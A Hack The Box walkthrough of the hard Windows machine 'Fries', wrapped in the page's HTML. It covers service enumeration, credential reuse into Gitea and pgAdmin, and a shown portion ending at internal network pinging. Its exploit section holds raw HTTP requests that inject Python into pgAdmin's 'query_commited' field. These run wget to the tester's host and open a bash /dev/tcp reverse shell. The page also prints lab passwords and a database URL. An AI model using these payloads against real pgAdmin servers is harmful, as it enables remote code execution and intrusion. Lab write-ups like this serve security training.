@@ -1,0 +1,833 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>Fries | Paracausal Telemetry</title><meta name="description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), SSH (22), HTTP (80)." /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-fries/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="Fries" /><meta property="og:description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), SSH (22), HTTP (80)." /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-fries/" /><meta property="og:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-fries/og.png?v=3e4afa6a" /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="630" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Fries" /><meta name="twitter:description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), SSH (22), HTTP (80)." /><meta name="twitter:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-fries/og.png?v=3e4afa6a" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-site9" /><style>.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-sources a,.writeup-article-footer a{display:inline-flex;align-items:center;min-height:24px}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}.writeup-page-pager{margin:0 0 1.2rem}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"Fries","description":"Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), SSH (22), HTTP (80).","url":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-fries/","datePublished":"2026-08-17","keywords":"Hack The Box, Active Directory, Windows","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"Fries","item":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-fries/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/" aria-current="page">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/#talks">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">Fries</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">Hack The Box · 2026-08-17 · 29 min read</p><h1>Fries</h1><p>Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), SSH (22), HTTP (80).</p><div class="writeup-meta"><span class="writeup-chip">Difficulty · hard</span><span class="writeup-chip writeup-chip-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg>OS · Windows</span><span class="writeup-chip writeup-chip-tag">Hack The Box</span><span class="writeup-chip writeup-chip-tag">Active Directory</span><span class="writeup-chip writeup-chip-tag">Windows</span></div><p class="writeup-sources"><a href="https://app.hackthebox.com/machines/Fries" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/HTB/ethan-bauer/htb-fries.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><section class="room-card" aria-label="Hack The Box machine details"><div class="room-card-head"><div class="room-card-title"><p class="eyebrow">Hack The Box machine</p><h2>Fries</h2></div><span class="room-badge room-badge-hard">Hard</span></div><dl class="room-facts"><div><dt>OS</dt><dd class="room-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg><span>Windows</span></dd></div></dl><p class="room-link"><a href="https://app.hackthebox.com/machines/Fries" rel="noreferrer" target="_blank">Open on Hack The Box<span class="visually-hidden"> (opens in a new tab)</span></a></p></section><div class="markdown-body"><h2>Machine Information</h2><p>Please allow up to 7 minutes for services to load. As is common in real life Windows penetration tests, you will start the Fries box with credentials for the following account : d.cooper@fries.htb / D4LE11maan!!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">d.cooper:D4LE11maan!!</code></pre><h2>Host file setup</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo nxc smb 10.129.244.72 --generate-hosts-file /etc/hosts
+[sudo] password for kali: 
+SMB         10.129.244.72   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:fries.htb) (signing:True) (SMBv1:None) (Null Auth:True)</code></pre><h2>Enumeration</h2><h3>Open ports</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p- --min-rate=2000 -sT dc01.fries.htb
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-17 18:40 +0100
+Nmap scan report for dc01.fries.htb (10.129.244.72)
+Host is up (0.015s latency).
+rDNS record for 10.129.244.72: DC01.fries.htb
+Not shown: 65510 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+22/tcp    open  ssh
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+443/tcp   open  https
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+2179/tcp  open  vmrdp
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49667/tcp open  unknown
+49681/tcp open  unknown
+49682/tcp open  unknown
+49684/tcp open  unknown
+49693/tcp open  unknown
+49917/tcp open  unknown
+49934/tcp open  unknown
+49975/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 66.32 seconds</code></pre><h3>Nmap</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p 22,53,80,88,135,139,389,443,445,464,593,636,2179,3268,3269,5985 -A --min-rate=2000 -sT dc01.fries.htb
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-17 18:43 +0100
+Nmap scan report for dc01.fries.htb (10.129.244.72)
+Host is up (0.015s latency).
+rDNS record for 10.129.244.72: DC01.fries.htb
+
+PORT     STATE SERVICE       VERSION
+22/tcp   open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA)
+|_  256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519)
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://fries.htb/
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-18 00:43:31Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fries.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
+| Not valid before: 2026-06-05T16:23:40
+|_Not valid after:  2106-06-05T16:23:40
+|_ssl-date: 2026-08-18T00:44:56+00:00; +6h59m57s from scanner time.
+443/tcp  open  ssl/http      nginx 1.18.0 (Ubuntu)
+| tls-nextprotoneg: 
+|_  http/1.1
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+| tls-alpn: 
+|_  http/1.1
+|_http-title: Site doesn&#39;t have a title (text/html;charset=ISO-8859-1).
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=pwm.fries.htb/organizationName=Fries Foods LTD/stateOrProvinceName=Madrid/countryName=SP
+| Not valid before: 2025-06-01T22:06:09
+|_Not valid after:  2026-06-01T22:06:09
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fries.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2026-08-18T00:44:57+00:00; +6h59m57s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
+| Not valid before: 2026-06-05T16:23:40
+|_Not valid after:  2106-06-05T16:23:40
+2179/tcp open  vmrdp?
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fries.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2026-08-18T00:44:57+00:00; +6h59m57s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
+| Not valid before: 2026-06-05T16:23:40
+|_Not valid after:  2106-06-05T16:23:40
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fries.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
+| Not valid before: 2026-06-05T16:23:40
+|_Not valid after:  2106-06-05T16:23:40
+|_ssl-date: 2026-08-18T00:44:57+00:00; +6h59m57s from scanner time.
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|router
+Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (91%), MikroTik RouterOS 7.X (91%)
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6
+Aggressive OS guesses: Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (91%), Linux 2.6.32 - 3.13 (85%), Linux 3.10 - 4.11 (85%), Linux 3.2 - 4.14 (85%), Linux 3.4 - 3.10 (85%), Linux 4.15 (85%), Linux 5.14 - 6.8 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: DC01; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows</code></pre><p>Some interesting services running</p><h2>SMB (445)</h2><p>Null auth doesnt give me anything</p><p>Guest account is also disabled</p><h3>Using provided credentials</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.fries.htb -u &#39;d.cooper&#39; -p &#39;D4LE11maan!!&#39; 
+SMB         10.129.244.72   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:fries.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.244.72   445    DC01             [-] fries.htb\d.cooper:D4LE11maan!! STATUS_LOGON_FAILURE</code></pre><p>So these credentials dont work on SMB</p><h2>SSH (22)</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ssh d.cooper@dc01.fries.htb            
+The authenticity of host &#39;dc01.fries.htb (10.129.244.72)&#39; can&#39;t be established.
+ED25519 key fingerprint is: SHA256:++SuiiJ+ZwG7d5q6fb9KqhQRx1gGhVOfGR24bbTuipg
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;dc01.fries.htb&#39; (ED25519) to the list of known hosts.
+d.cooper@dc01.fries.htb&#39;s password:</code></pre><p>So the credentials get me access here either!</p><p>Also worth noting that its using password auth</p><h2>HTTP (80)</h2><p><img src="images/fries/pasted-image-20260817185300.webp" alt="Screenshot" loading="lazy" /></p><p>No login portal here so i cannot use credentials!</p><p>Also not a lot on the website in terms of functionality</p><p><img src="images/fries/pasted-image-20260817194210.webp" alt="Screenshot" loading="lazy" /></p><p>Found some potential users</p><p>If i know d.cooper is a valid user i can take the same format for these names</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">e.thompson
+d.rodriguez
+s.chen
+d.cooper</code></pre><p>I can now run this list against kerbrute to see if they are valid</p><p>Only <code>d.cooper</code> is valid</p><h3>Subdomains</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ffuf -u http://fries.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H &#39;Host: FUZZ.fries.htb&#39; -ic -c -t 30 -fs 154
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://fries.htb/
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+ :: Header           : Host: FUZZ.fries.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 30
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 154
+________________________________________________
+
+code                    [Status: 200, Size: 13593, Words: 1048, Lines: 272, Duration: 41ms]
+:: Progress: [114438/114438] :: Job [1/1] :: 2112 req/sec :: Duration: [0:01:16] :: Errors: 0 ::</code></pre><p>Found a subdomain <code>code</code></p><h2><code>code</code> subdomain </h2><p>This subdomain is a Gitea instance</p><p>There are no public or archived repos</p><p><img src="images/fries/pasted-image-20260817193726.webp" alt="Screenshot" loading="lazy" /></p><p>There are two users however</p><p><img src="images/fries/pasted-image-20260817193850.webp" alt="Screenshot" loading="lazy" /></p><p>Using the provided password on the user <code>dale</code> got me access to the instance!</p><p>I will have a look through this repo</p><p><img src="images/fries/pasted-image-20260817194724.webp" alt="Screenshot" loading="lazy" /></p><p>So looks like there is another subdomain <code>db-mgmt05</code>, ill add to my hosts file</p><p>Also a screenshot in the repo of a <code>svc</code> user</p><p>Ill now look through the commit history</p><p><img src="images/fries/pasted-image-20260817194906.webp" alt="Screenshot" loading="lazy" /></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">DATABASE_URL=postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432/ps_db
+SECRET_KEY=y0st528wn1idjk3b9a</code></pre><h2><code>db-mgmt05</code> subdomain</h2><p><img src="images/fries/pasted-image-20260817195831.webp" alt="Screenshot" loading="lazy" /></p><p>The credentials <code>d.cooper@fries.htb:D4LE11maan!!</code> got me access here</p><p>Now i should be able to access the database</p><p><img src="images/fries/pasted-image-20260817200356.webp" alt="Screenshot" loading="lazy" /></p><p>Using the password found in the gitea instance <code>PsqLR00tpaSS11</code> i could log in as the root user and access the database</p><p><img src="images/fries/pasted-image-20260817201313.webp" alt="Screenshot" loading="lazy" /></p><p>Ive had a quick look through, there is nothing interesting in the tables</p><p>But i can so some research on this version</p><p>It looks to be vulnerable to <code>CVE-2025-2945</code></p><h2>CVE-2025-2945 RCE</h2><p><img src="images/fries/pasted-image-20260817202948.webp" alt="Screenshot" loading="lazy" /></p><p>So first ill select a DB on the left panel and right click and choose query tool</p><p>Then ill run a test query then using the <code>Execute Script</code> button, from here ill click <code>Save Results To File</code> in the data output section and proxy the request through Caido</p><p>Then in caido ill see a bunch of requests ill grab the POST rrquest and send it to replay</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">POST /sqleditor/query_tool/download/8940911 HTTP/1.1
+Host: db-mgmt05.fries.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+X-pgA-CSRFToken: ImI1ODc1OGY0NTIwODEyMjExMTUxYTVmZDZlYjA0MTgyZDJhNDgyMDYi.aoPDHA.nKY3l9kaRFEj5n3MCYWF2aJWZjc
+Content-Length: 60
+Origin: http://db-mgmt05.fries.htb
+Connection: keep-alive
+Referer: http://db-mgmt05.fries.htb/sqleditor/panel/8940911?is_query_tool=true&amp;sgid=2&amp;sid=2&amp;did=16409&amp;database_name=gitea
+Cookie: pga4_session=bc8d3959-2ea9-4cdb-8e13-b5f79457ce5d!8NkQJMfKNMvE0AoFGQCbSfE/gqzOrSkBxsD5B2GNjkY=; PGADMIN_LANGUAGE=en
+Priority: u=0
+
+{&quot;filename&quot;:&quot;data-1786995094761.csv&quot;,&quot;query_commited&quot;:false}</code></pre><p>So after some research the RCE lies in the <code>query_commited</code> parameter</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 -m http.server 80  
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</code></pre><p>So ill start up a wabserver</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">POST /sqleditor/query_tool/download/7415033 HTTP/1.1
+Host: db-mgmt05.fries.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+X-pgA-CSRFToken: IjQ1OTg1YTk5YmFhNjY1YzhkOGRmZGMxMGZjOTY1NzAxZTllYmY0NDQi.aoPIcg.zoMzAupIL0QmZYOR2pIyQeOUgSE
+Content-Length: 60
+Origin: http://db-mgmt05.fries.htb
+Connection: keep-alive
+Referer: http://db-mgmt05.fries.htb/sqleditor/panel/7415033?is_query_tool=true&amp;sgid=2&amp;sid=2&amp;did=16409&amp;database_name=gitea
+Cookie: pga4_session=bc8d3959-2ea9-4cdb-8e13-b5f79457ce5d!8NkQJMfKNMvE0AoFGQCbSfE/gqzOrSkBxsD5B2GNjkY=; PGADMIN_LANGUAGE=en
+Priority: u=0
+
+{&quot;filename&quot;:&quot;data-1786996252089.csv&quot;,&quot;query_commited&quot;:&quot;__import__(&#39;os&#39;).system(&#39;wget http://10.10.14.61/test.txt&#39;)&quot;}</code></pre><p>Then send the following request</p><p><img src="images/fries/pasted-image-20260817205256.webp" alt="Screenshot" loading="lazy" /></p><p>I have RCE</p><p>And after some testing, it does not reflect output, so ill just get a shell!</p><h2>Shell as <code>pgadmin</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">penelope -p 1337
+[+] Listening for reverse shells on 0.0.0.0:1337 -&gt; 127.0.0.1 • 192.168.86.128 • 10.10.14.61
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)</code></pre><p>So firtst ill start a listener</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">POST /sqleditor/query_tool/download/7415033 HTTP/1.1
+Host: db-mgmt05.fries.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+X-pgA-CSRFToken: IjQ1OTg1YTk5YmFhNjY1YzhkOGRmZGMxMGZjOTY1NzAxZTllYmY0NDQi.aoPIcg.zoMzAupIL0QmZYOR2pIyQeOUgSE
+Content-Length: 60
+Origin: http://db-mgmt05.fries.htb
+Connection: keep-alive
+Referer: http://db-mgmt05.fries.htb/sqleditor/panel/7415033?is_query_tool=true&amp;sgid=2&amp;sid=2&amp;did=16409&amp;database_name=gitea
+Cookie: pga4_session=bc8d3959-2ea9-4cdb-8e13-b5f79457ce5d!8NkQJMfKNMvE0AoFGQCbSfE/gqzOrSkBxsD5B2GNjkY=; PGADMIN_LANGUAGE=en
+Priority: u=0
+
+{&quot;filename&quot;:&quot;data-1786996252089.csv&quot;,&quot;query_commited&quot;:&quot;__import__(&#39;os&#39;).system(&#39;bash -c \&quot;exec bash -i &amp;&gt;/dev/tcp/10.10.14.61/1337 &lt;&amp;1\&quot;&#39;)&quot;}</code></pre><p>Then ill send this request, with a shell i got from hack-tools frefox extension</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">penelope -p 1337
+[+] Listening for reverse shells on 0.0.0.0:1337 -&gt; 127.0.0.1 • 192.168.86.128 • 10.10.14.61
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] =&gt; cb46692a4590 10.129.244.72 Linux-x86_64 👤 pgadmin(5050) 😍️ Session ID &lt;1&gt;
+[+] Upgrading shell to PTY...
+[+] PTY upgrade successful via /usr/bin/python3
+[+] Interacting with session [1] • PTY • Menu key F12 ⇐
+[+] Session log: /home/kali/.penelope/sessions/cb46692a4590~10.129.244.72-Linux-x86_64/2026_08_17-20_55_13-341.log
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+cb46692a4590:/pgadmin4$ whoami
+pgadmin
+cb46692a4590:/pgadmin4$</code></pre><p>I now have a shell, on presumably the linux vm that is running</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">cb46692a4590:/pgadmin4$ env
+SHELL=/bin/bash
+PGADMIN_DEFAULT_PASSWORD=Friesf00Ds2025!!
+CORRUPTED_DB_BACKUP_FILE=
+PGAPPNAME=pgAdmin 4 - CONN:1840860
+HOSTNAME=cb46692a4590
+SERVER_SOFTWARE=gunicorn/22.0.0
+PWD=/pgadmin4
+CONFIG_DISTRO_FILE_PATH=/pgadmin4/config_distro.py
+HOME=/home/pgadmin
+OAUTHLIB_INSECURE_TRANSPORT=1
+PYTHONPATH=/pgadmin4
+TERM=xterm-256color
+SHLVL=3
+PGADMIN_DEFAULT_EMAIL=admin@fries.htb
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+_=/usr/bin/env
+cb46692a4590:/pgadmin4$</code></pre><p>Found a password for what looks like the admin user on the pgadmin install!</p><p>Now my first instinct is to try and connect to the database running that i found earlier. But is looks as if theres nothing running locally on this machine apart from the web app</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">cb46692a4590:/pgadmin4$ ifconfig 
+eth0      Link encap:Ethernet  HWaddr BE:2C:24:C3:02:47  
+          inet addr:172.18.0.4  Bcast:172.18.255.255  Mask:255.255.0.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:108241 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:82876 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:14861578 (14.1 MiB)  TX bytes:32470280 (30.9 MiB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:72 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:72 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:4392 (4.2 KiB)  TX bytes:4392 (4.2 KiB)</code></pre><p>So i think my plan is to upload a ligolo agent then try and use nmap to scan the internal network</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">cb46692a4590:/pgadmin4$ which ping
+/bin/ping
+cb46692a4590:/pgadmin4$ ping 172.18.0.3
+PING 172.18.0.3 (172.18.0.3): 56 data bytes
+64 bytes from 172.18.0.3: seq=0 ttl=42 time=0.109 ms
+64 bytes from 172.18.0.3: seq=1 ttl=42 time=0.115 ms
+^C
+--- 172.18.0.3 ping statistics ---
+2 packets transmitted, 2 packets received, 0% packet loss
+round-trip min/avg/max = 0.109/0.112/0.115 ms
+cb46692a4590:/pgadmin4$ ping 172.18.0.5
+PING 172.18.0.5 (172.18.0.5): 56 data bytes
+64 bytes from 172.18.0.5: seq=0 ttl=42 time=0.512 ms
+64 bytes from 172.18.0.5: seq=1 ttl=42 time=0.098 ms
